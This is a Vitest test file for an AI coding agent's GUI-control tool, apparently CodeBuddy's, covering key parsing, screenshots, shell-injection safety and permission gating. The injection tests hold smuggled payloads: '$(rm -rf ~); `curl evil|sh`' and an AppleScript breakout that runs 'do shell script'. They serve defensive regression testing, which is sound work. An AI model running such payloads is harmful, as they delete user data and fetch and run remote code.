import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { parseKeyCombination, captureScreenshotNative, executeGuiAction, guiControl } from '../../src/tools/gui-tool.js';

// ============================================================================
// Mocks
// ============================================================================

vi.mock('child_process', () => ({
  execSync: vi.fn(),
  execFileSync: vi.fn(),
}));

vi.mock('fs', () => ({
  readFileSync: vi.fn(() => Buffer.from('fakepng')),
  unlinkSync: vi.fn(),
  existsSync: vi.fn(() => true),
}));

vi.mock('os', () => ({
  tmpdir: vi.fn(() => '/tmp'),
}));

// Force the native (xdotool/osascript) fallback path: make nut-js unavailable so
// getNutjs() catches the rejected import and returns null. This is exactly the
// headless/minimal-Linux situation where the shell-fallback RCE (S1) lived.
vi.mock('@nut-tree-fork/nut-js', () => {
  throw new Error('nut-js unavailable (test)');
});

import { execSync, execFileSync } from 'child_process';
import { readFileSync, existsSync } from 'fs';

// ============================================================================
// parseKeyCombination
// ============================================================================

describe('parseKeyCombination', () => {
  it('parses a simple key with no modifiers', () => {
    const result = parseKeyCombination('enter');
    expect(result.key).toBe('enter');
    expect(result.modifiers).toEqual([]);
  });

  it('parses ctrl+c', () => {
    const result = parseKeyCombination('ctrl+c');
    expect(result.modifiers).toContain('ctrl');
    expect(result.key).toBe('c');
  });

  it('parses ctrl+shift+s', () => {
    const result = parseKeyCombination('ctrl+shift+s');
    expect(result.modifiers).toContain('ctrl');
    expect(result.modifiers).toContain('shift');
    expect(result.key).toBe('s');
  });

  it('normalises "control" to "ctrl"', () => {
    const result = parseKeyCombination('control+v');
    expect(result.modifiers).toContain('ctrl');
    expect(result.key).toBe('v');
  });

  it('normalises "cmd" to "meta"', () => {
    const result = parseKeyCombination('cmd+z');
    expect(result.modifiers).toContain('meta');
    expect(result.key).toBe('z');
  });

  it('normalises "win" to "meta"', () => {
    const result = parseKeyCombination('win+d');
    expect(result.modifiers).toContain('meta');
    expect(result.key).toBe('d');
  });

  it('handles single function key', () => {
    const result = parseKeyCombination('f5');
    expect(result.key).toBe('f5');
    expect(result.modifiers).toEqual([]);
  });

  it('is case-insensitive', () => {
    const result = parseKeyCombination('CTRL+C');
    expect(result.modifiers).toContain('ctrl');
    expect(result.key).toBe('c');
  });
});

// ============================================================================
// captureScreenshotNative — platform command selection
// ============================================================================

describe('captureScreenshotNative', () => {
  const originalPlatform = process.platform;

  function setPlatform(p: string) {
    Object.defineProperty(process, 'platform', { value: p, configurable: true });
  }

  afterEach(() => {
    Object.defineProperty(process, 'platform', { value: originalPlatform, configurable: true });
    vi.restoreAllMocks();
  });

  it('calls powershell on Windows', () => {
    setPlatform('win32');
    vi.mocked(execSync).mockReturnValue(Buffer.from(''));
    vi.mocked(existsSync).mockReturnValue(true);
    vi.mocked(readFileSync).mockReturnValue(Buffer.from('png'));

    const result = captureScreenshotNative();
    expect(result).toBeTruthy();
    const calls = vi.mocked(execSync).mock.calls;
    expect(calls.some(([cmd]) => typeof cmd === 'string' && cmd.includes('powershell'))).toBe(true);
  });

  it('calls screencapture on macOS (via execFileSync, no shell)', () => {
    setPlatform('darwin');
    vi.mocked(execFileSync).mockReturnValue(Buffer.from(''));
    vi.mocked(existsSync).mockReturnValue(true);
    vi.mocked(readFileSync).mockReturnValue(Buffer.from('png'));

    const result = captureScreenshotNative();
    expect(result).toBeTruthy();
    const calls = vi.mocked(execFileSync).mock.calls;
    expect(calls.some(([cmd]) => cmd === 'screencapture')).toBe(true);
  });

  it('returns base64 string', () => {
    setPlatform('darwin');
    vi.mocked(execSync).mockReturnValue(Buffer.from(''));
    vi.mocked(existsSync).mockReturnValue(true);
    vi.mocked(readFileSync).mockReturnValue(Buffer.from('PNG_DATA'));

    const result = captureScreenshotNative();
    expect(typeof result).toBe('string');
    // base64 of "PNG_DATA"
    expect(result).toBe(Buffer.from('PNG_DATA').toString('base64'));
  });

  it('throws when screenshot file not created', () => {
    setPlatform('darwin');
    vi.mocked(execSync).mockReturnValue(Buffer.from(''));
    vi.mocked(existsSync).mockReturnValue(false);

    expect(() => captureScreenshotNative()).toThrow('Screenshot file not created');
  });
});

// ============================================================================
// executeGuiAction
// ============================================================================

describe('executeGuiAction', () => {
  afterEach(() => vi.restoreAllMocks());

  it('screenshot action returns base64 screenshot', async () => {
    vi.mocked(execSync).mockReturnValue(Buffer.from(''));
    vi.mocked(existsSync).mockReturnValue(true);
    vi.mocked(readFileSync).mockReturnValue(Buffer.from('SCREENBYTES'));

    const result = await executeGuiAction({ action: 'screenshot' });
    expect(result.success).toBe(true);
    expect(result.screenshot).toBeTruthy();
  });

  it('click without coordinates returns error', async () => {
    const result = await executeGuiAction({ action: 'click' });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/x and y/);
  });

  it('type without text returns error', async () => {
    const result = await executeGuiAction({ action: 'type' });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/text/);
  });

  it('key without keys returns error', async () => {
    const result = await executeGuiAction({ action: 'key' });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/keys/);
  });

  it('scroll without coordinates returns error', async () => {
    const result = await executeGuiAction({ action: 'scroll' });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/x and y/);
  });

  it('find_element without description returns error', async () => {
    const result = await executeGuiAction({ action: 'find_element' });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/description/);
  });

  it('find_element with description returns screenshot', async () => {
    vi.mocked(execSync).mockReturnValue(Buffer.from(''));
    vi.mocked(existsSync).mockReturnValue(true);
    vi.mocked(readFileSync).mockReturnValue(Buffer.from('FINDPNG'));

    const result = await executeGuiAction({ action: 'find_element', description: 'Submit button' });
    expect(result.success).toBe(true);
    expect(result.screenshot).toBeTruthy();
  });
});

// ============================================================================
// S1 — shell-injection safety of the native (xdotool/osascript) fallback
// ============================================================================

describe('gui fallback is shell-injection safe (S1)', () => {
  const originalPlatform = process.platform;
  function setPlatform(p: string) {
    Object.defineProperty(process, 'platform', { value: p, configurable: true });
  }
  beforeEach(() => {
    setPlatform('linux');
    vi.mocked(execFileSync).mockReset().mockReturnValue(Buffer.from(''));
    vi.mocked(execSync).mockReset().mockReturnValue(Buffer.from(''));
  });
  afterEach(() => {
    Object.defineProperty(process, 'platform', { value: originalPlatform, configurable: true });
    vi.restoreAllMocks();
  });

  it('type routes text through execFileSync as a discrete argv entry (no shell string)', async () => {
    const payload = '$(rm -rf ~); `curl evil|sh`';
    const result = await executeGuiAction({ action: 'type', text: payload });
    expect(result.success).toBe(true);

    // The dangerous payload must NEVER appear inside a single string command
    // handed to a shell — execSync must not be used for the type fallback.
    const shellCalls = vi.mocked(execSync).mock.calls;
    expect(shellCalls.some(([cmd]) => typeof cmd === 'string' && cmd.includes(payload))).toBe(false);

    // It must be passed to execFileSync as its own argv element, verbatim.
    const fileCalls = vi.mocked(execFileSync).mock.calls;
    const typeCall = fileCalls.find(([cmd]) => cmd === 'xdotool');
    expect(typeCall).toBeTruthy();
    const [, args] = typeCall as [string, string[]];
    expect(args).toEqual(['type', '--clearmodifiers', '--', payload]);
  });

  it('key routes the combo through execFileSync as a single argv entry', async () => {
    const result = await executeGuiAction({ action: 'key', keys: 'ctrl+c' });
    expect(result.success).toBe(true);
    const fileCalls = vi.mocked(execFileSync).mock.calls;
    const keyCall = fileCalls.find(([cmd]) => cmd === 'xdotool');
    expect(keyCall).toBeTruthy();
    const [, args] = keyCall as [string, string[]];
    expect(args[0]).toBe('key');
    expect(args).toHaveLength(2); // ['key', 'ctrl+c'] — combo is ONE arg, unsplit by a shell
    expect(execSync).not.toHaveBeenCalled();
  });

  it('click validates coordinates and passes integers as argv (no shell)', async () => {
    const result = await executeGuiAction({ action: 'click', x: 100, y: 200 });
    expect(result.success).toBe(true);
    const fileCalls = vi.mocked(execFileSync).mock.calls;
    const clickCall = fileCalls.find(([cmd]) => cmd === 'xdotool');
    expect(clickCall).toBeTruthy();
    const [, args] = clickCall as [string, string[]];
    expect(args).toContain('mousemove');
    expect(args).toContain('100');
    expect(args).toContain('200');
  });

  it('click rejects a non-finite / negative coordinate before spawning', async () => {
    const bad = await executeGuiAction({ action: 'click', x: Number.NaN, y: 5 });
    expect(bad.success).toBe(false);
    expect(bad.error).toMatch(/Invalid x/);
    // Nothing was executed.
    expect(execFileSync).not.toHaveBeenCalled();

    const neg = await executeGuiAction({ action: 'click', x: -5000, y: -5000 });
    expect(neg.success).toBe(false);
    expect(neg.error).toMatch(/Invalid x/);
  });

  it('osascript key on darwin escapes the AppleScript string literal', async () => {
    setPlatform('darwin');
    // A key crafted to break out of the keystroke "..." literal.
    await executeGuiAction({ action: 'key', keys: 'a"; do shell script "id' });
    const fileCalls = vi.mocked(execFileSync).mock.calls;
    const osa = fileCalls.find(([cmd]) => cmd === 'osascript');
    expect(osa).toBeTruthy();
    const [, args] = osa as [string, string[]];
    const script = args[1];
    // The raw unescaped break-out sequence must not appear; the quote is escaped.
    expect(script).toContain('\\"');
    expect(script).not.toMatch(/keystroke "a"; do shell script/);
  });
});

// ============================================================================
// S4 — gui_control is gated (permission mode + destructive combos)
// ============================================================================

import { getPermissionModeManager, resetPermissionModeManager } from '../../src/security/permission-modes.js';

describe('gui_control gating (S4)', () => {
  const originalPlatform = process.platform;
  function setPlatform(p: string) {
    Object.defineProperty(process, 'platform', { value: p, configurable: true });
  }
  beforeEach(() => {
    setPlatform('linux');
    resetPermissionModeManager();
    vi.mocked(execFileSync).mockReset().mockReturnValue(Buffer.from(''));
    delete process.env.CODEBUDDY_GUI_ALLOW_SYSTEM_KEYS;
  });
  afterEach(() => {
    Object.defineProperty(process, 'platform', { value: originalPlatform, configurable: true });
    resetPermissionModeManager();
    delete process.env.CODEBUDDY_GUI_ALLOW_SYSTEM_KEYS;
    vi.restoreAllMocks();
  });

  it('blocks a mutating action in plan (read-only) mode; no subprocess spawned', async () => {
    getPermissionModeManager().setMode('plan');
    const result = await executeGuiAction({ action: 'type', text: 'hello' });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/blocked/i);
    expect(execFileSync).not.toHaveBeenCalled();
  });

  it('allows a mutating action in default mode', async () => {
    getPermissionModeManager().setMode('default');
    const result = await executeGuiAction({ action: 'type', text: 'hello' });
    expect(result.success).toBe(true);
    expect(execFileSync).toHaveBeenCalled();
  });

  it('does not gate read-only screenshot even in plan mode', async () => {
    getPermissionModeManager().setMode('plan');
    vi.mocked(existsSync).mockReturnValue(true);
    vi.mocked(readFileSync).mockReturnValue(Buffer.from('PNG'));
    const result = await executeGuiAction({ action: 'screenshot' });
    expect(result.success).toBe(true);
  });

  it('refuses a VT-switch / display-kill combo by default', async () => {
    getPermissionModeManager().setMode('default');
    for (const keys of ['ctrl+alt+f1', 'ctrl+alt+f12', 'ctrl+alt+delete', 'ctrl+alt+backspace']) {
      const result = await executeGuiAction({ action: 'key', keys });
      expect(result.success, keys).toBe(false);
      expect(result.error, keys).toMatch(/system key combo/i);
    }
    expect(execFileSync).not.toHaveBeenCalled();
  });

  it('allows a normal combo (ctrl+c) and a system combo under explicit opt-in', async () => {
    getPermissionModeManager().setMode('default');
    const ok = await executeGuiAction({ action: 'key', keys: 'ctrl+c' });
    expect(ok.success).toBe(true);

    process.env.CODEBUDDY_GUI_ALLOW_SYSTEM_KEYS = 'true';
    const opted = await executeGuiAction({ action: 'key', keys: 'ctrl+alt+f1' });
    expect(opted.success).toBe(true);
  });
});

// ============================================================================
// guiControl — ToolResult adapter
// ============================================================================

describe('guiControl', () => {
  afterEach(() => vi.restoreAllMocks());

  it('returns success with screenshot text in output', async () => {
    vi.mocked(execSync).mockReturnValue(Buffer.from(''));
    vi.mocked(existsSync).mockReturnValue(true);
    vi.mocked(readFileSync).mockReturnValue(Buffer.from('BYTES'));

    const result = await guiControl({ action: 'screenshot' });
    expect(result.success).toBe(true);
    expect(result.output).toContain('screenshot');
    expect(result.output).toContain('data:image/png;base64,');
  });

  it('returns failure on bad action', async () => {
    const result = await guiControl({ action: 'click' }); // missing x/y
    expect(result.success).toBe(false);
    expect(result.error).toBeTruthy();
  });
});
